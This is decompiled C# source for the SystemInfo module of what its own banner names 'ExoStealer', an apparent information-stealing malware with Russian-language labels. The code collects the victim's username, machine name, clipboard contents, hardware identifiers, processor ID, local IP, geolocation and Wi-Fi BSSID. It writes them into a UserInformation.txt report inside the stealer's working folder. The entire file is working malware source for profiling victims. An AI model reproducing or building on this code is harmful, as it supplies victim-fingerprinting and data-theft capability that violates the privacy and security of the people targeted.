using System;
using System.Drawing;
using System.IO;
using System.Management;
using System.Windows.Forms;
using Microsoft.Win32;
using exos.utils;

namespace exos;

internal class SystemInfo
{
	public static string username = Environment.UserName;

	public static string compname = Environment.MachineName;

	public static void GetSystem()
	{
		string exploitDir = Helper.ExploitDir;
		string contents = "\n  /$$$$$$$$                                /$$$$$$   /$$                         /$$\n | $$_____/                               /$$__  $$ | $$                        | $$\n | $$       /$$   /$$  /$$$$$$   /$$$$$$$| $$  \\__//$$$$$$    /$$$$$$   /$$$$$$ | $$\n | $$$$$   |  $$ /$$/ /$$__  $$ /$$_____/|  $$$$$$|_  $$_/   /$$__  $$ |____  $$| $$\n | $$__/    \\  $$$$/ | $$  \\ $$|  $$$$$$  \\____  $$ | $$    | $$$$$$$$  /$$$$$$$| $$\n | $$        >$$  $$ | $$  | $$ \\____  $$ /$$  \\ $$ | $$ /$$| $$_____/ /$$__  $$| $$\n | $$$$$$$$ /$$/\\  $$|  $$$$$$/ /$$$$$$$/|  $$$$$$/ |  $$$$/|  $$$$$$$|  $$$$$$$| $$\n |________/|__/  \\__/ \\______/ |_______/  \\______/   \\___/   \\_______/ \\_______/|__/\n ==================================================\n Система: " + GetSystemVersion() + "\n Юзер: " + compname + "/" + username + "\n Скопированное: " + Buffer.GetBuffer() + "\n Запуск: " + Helper.ExploitName + "\n ==================================================\n Скрин: " + ScreenMetrics() + "\n Время: " + DateTime.Now.ToString() + "\n Хвид: " + GetProcessorID() + "\n ==================================================\n CPU: " + GetCPUName() + "\n Озу: " + GetRAM() + "\n GPU: " + GetGpuName() + "\n ==================================================\n Локация: " + MainMenu.GetLocalIPAddress() + " [" + GeoGet.Geo() + "]\n Дата: " + Helper.date + "\n БСИД: " + BSSID.GetBSSID() + "\n ==================================================";
		File.WriteAllText(exploitDir + "\\UserInformation.txt", contents);
	}

	public static string GetSystemVersion()
	{
		return GetWindowsVersionName() + " " + GetBitVersion();
	}

	public static string GetWindowsVersionName()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		string text = "Unknown System";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						text = Convert.ToString(((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"]);
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				text = text.Split(new char[1] { '|' })[0];
				int length = text.Split(new char[1] { ' ' })[0].Length;
				text = text.Substring(length).TrimStart(Array.Empty<char>()).TrimEnd(Array.Empty<char>());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return text;
	}

	private static string GetBitVersion()
	{
		try
		{
			if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString()
				.Contains("x86"))
			{
				return "(32 Bit)";
			}
			return "(64 Bit)";
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return "(Unknown)";
	}

	public static string CountryCode()
	{
		if (Helper.check)
		{
			return "[" + Helper.xml.GetElementsByTagName("CountryCode")[0].InnerText + "]";
		}
		return "Fail";
	}

	public static string Country()
	{
		if (Helper.check)
		{
			return "[" + Helper.xml.GetElementsByTagName("CountryName")[0].InnerText + "]";
		}
		return "Неизвестно";
	}

	public static string IP()
	{
		if (Helper.check)
		{
			return Helper.xml.GetElementsByTagName("IP")[0].InnerText;
		}
		return "Неизвестно";
	}

	public static string ScreenMetrics()
	{
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		int width = bounds.Width;
		int height = bounds.Height;
		return width + "x" + height;
	}

	public static string GetCPUName()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					result = ((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"].ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "СистемИнфа");
			return "Ошибка";
		}
	}

	public static string GetRAM()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						num = (int)(Convert.ToDouble(((ManagementBaseObject)(ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0) - 1;
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return num + "MB";
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return "Ошибка";
		}
	}

	public static string GetProcessorID()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				result = (string)((ManagementBaseObject)(ManagementObject)enumerator.Current)["ProcessorId"];
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string GetGpuName()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"].ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return "Unknown";
	}
}
